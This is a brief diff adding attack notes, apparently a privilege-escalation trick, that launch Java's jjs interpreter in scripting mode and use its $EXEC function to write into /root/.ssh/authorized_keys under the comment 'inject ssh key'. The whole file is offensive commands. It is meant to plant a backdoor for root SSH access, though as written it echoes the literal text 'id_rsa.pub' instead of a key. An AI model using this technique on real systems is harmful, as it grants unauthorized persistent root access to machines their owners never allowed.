@@ -1,0 +1,6 @@
+#-script for running command like ('cat,echo,ls')
+/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs -scripting
+
+#inject ssh key
+
+jjs > $EXEC("echo 'id_rsa.pub' > /root/.ssh/authorized_keys")
